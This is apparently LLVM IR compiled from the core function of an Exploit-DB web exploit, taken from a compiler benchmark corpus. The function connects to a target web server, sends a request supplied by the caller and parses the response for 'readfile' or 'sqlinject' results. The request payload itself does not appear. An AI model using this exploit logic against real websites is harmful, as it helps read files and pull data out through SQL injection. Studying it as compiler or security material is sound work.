; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_2527.c_Exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_2527.c_Exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32 }
%struct.sockaddr_in = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"readfile\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"\0A [+] Exploit Result:\0A\0A%s\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"sqlinject\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.5 = private unnamed_addr constant [36 x i8] c"\0A[-] some error. change MODE param\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @Exploit(i8* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [10024 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  %18 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 0
  %19 = call i32 @memset(i8* %18, i32 0, i32 10024)
  %20 = load i32, i32* @AF_INET, align 4
  %21 = load i32, i32* @SOCK_STREAM, align 4
  %22 = call i32 @socket(i32 %20, i32 %21, i32 0)
  store i32 %22, i32* %11, align 4
  %23 = icmp slt i32 %22, 0
  br i1 %23, label %24, label %25

24:                                               ; preds = %3
  store i32 -1, i32* %4, align 4
  br label %153

25:                                               ; preds = %3
  %26 = call i32 @bzero(%struct.sockaddr_in* %12, i32 12)
  %27 = load i32, i32* @AF_INET, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %27, i32* %28, align 4
  %29 = call i32 @htons(i32 80)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %29, i32* %30, align 4
  %31 = load i8*, i8** %7, align 8
  %32 = call %struct.hostent* @gethostbyname(i8* %31)
  store %struct.hostent* %32, %struct.hostent** %10, align 8
  %33 = load %struct.hostent*, %struct.hostent** %10, align 8
  %34 = icmp ne %struct.hostent* %33, null
  br i1 %34, label %35, label %44

35:                                               ; preds = %25
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %37 = load %struct.hostent*, %struct.hostent** %10, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 1
  %39 = load i32, i32* %38, align 4
  %40 = load %struct.hostent*, %struct.hostent** %10, align 8
  %41 = getelementptr inbounds %struct.hostent, %struct.hostent* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = call i32 @memcpy(i32* %36, i32 %39, i32 %42)
  br label %45

44:                                               ; preds = %25
  store i32 1, i32* %4, align 4
  br label %153

45:                                               ; preds = %35
  %46 = load i32, i32* %11, align 4
  %47 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %48 = call i64 @connect(i32 %46, %struct.sockaddr* %47, i32 12)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %51

50:                                               ; preds = %45
  store i32 -1, i32* %4, align 4
  br label %153

51:                                               ; preds = %45
  %52 = load i32, i32* %11, align 4
  %53 = load i8*, i8** %5, align 8
  %54 = load i8*, i8** %5, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = call i32 @send(i32 %52, i8* %53, i32 %55, i32 0)
  br label %57

57:                                               ; preds = %114, %51
  %58 = load i32, i32* %11, align 4
  %59 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 0
  %60 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 0
  %61 = call i32 @strlen(i8* %60)
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %59, i64 %62
  %64 = call i32 @recv(i32 %58, i8* %63, i32 1, i32 0)
  store i32 %64, i32* %13, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %115

66:                                               ; preds = %57
  store i32 0, i32* %13, align 4
  br label %67

67:                                               ; preds = %111, %66
  %68 = load i32, i32* %13, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %114

74:                                               ; preds = %67
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 %76
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 13
  br i1 %80, label %81, label %110

81:                                               ; preds = %74
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp eq i32 %87, 10
  br i1 %88, label %89, label %110

89:                                               ; preds = %81
  %90 = load i32, i32* %13, align 4
  %91 = add nsw i32 %90, 2
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 %92
  %94 = load i8, i8* %93, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp eq i32 %95, 13
  br i1 %96, label %97, label %110

97:                                               ; preds = %89
  %98 = load i32, i32* %13, align 4
  %99 = add nsw i32 %98, 3
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp eq i32 %103, 10
  br i1 %104, label %105, label %110

105:                                              ; preds = %97
  %106 = load i32, i32* %13, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [10024 x i8], [10024 x i8]* %8, i64 0, i64 %107
  %109 = getelementptr inbounds i8, i8* %108, i64 4
  store i8* %109, i8** %9, align 8
  br label %114

110:                                              ; preds = %97, %89, %81, %74
  br label %111

111:                                              ; preds = %110
  %112 = load i32, i32* %13, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %13, align 4
  br label %67

114:                                              ; preds = %105, %67
  br label %57

115:                                              ; preds = %57
  %116 = load i8*, i8** %6, align 8
  %117 = call i64 @strcmp(i8* %116, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  %118 = icmp eq i64 %117, 0
  br i1 %118, label %119, label %122

119:                                              ; preds = %115
  %120 = load i8*, i8** %9, align 8
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* %120)
  store i32 0, i32* %4, align 4
  br label %153

122:                                              ; preds = %115
  %123 = load i8*, i8** %6, align 8
  %124 = call i64 @strcmp(i8* %123, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %125 = icmp eq i64 %124, 0
  br i1 %125, label %126, label %148

126:                                              ; preds = %122
  store i8* null, i8** %15, align 8
  store i8* null, i8** %16, align 8
  store i8* null, i8** %17, align 8
  %127 = load i8*, i8** %9, align 8
  %128 = call i8* @strtok(i8* %127, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i8* %128, i8** %15, align 8
  %129 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i8* %129, i8** %15, align 8
  %130 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i8* %130, i8** %15, align 8
  %131 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i8* %131, i8** %15, align 8
  store i32 0, i32* %14, align 4
  br label %132

132:                                              ; preds = %144, %126
  %133 = load i32, i32* %14, align 4
  %134 = icmp slt i32 %133, 2
  br i1 %134, label %135, label %147

135:                                              ; preds = %132
  %136 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i8* %136, i8** %15, align 8
  %137 = load i32, i32* %14, align 4
  %138 = icmp eq i32 %137, 1
  br i1 %138, label %139, label %143

139:                                              ; preds = %135
  %140 = load i8*, i8** %15, align 8
  store i8* %140, i8** %16, align 8
  %141 = load i8*, i8** %16, align 8
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* %141)
  br label %143

143:                                              ; preds = %139, %135
  br label %144

144:                                              ; preds = %143
  %145 = load i32, i32* %14, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %14, align 4
  br label %132

147:                                              ; preds = %132
  br label %150

148:                                              ; preds = %122
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %153

150:                                              ; preds = %147
  %151 = load i32, i32* %11, align 4
  %152 = call i32 @close(i32 %151)
  store i32 0, i32* %4, align 4
  br label %153

153:                                              ; preds = %150, %148, %119, %50, %44, %24
  %154 = load i32, i32* %4, align 4
  ret i32 %154
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @strtok(i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
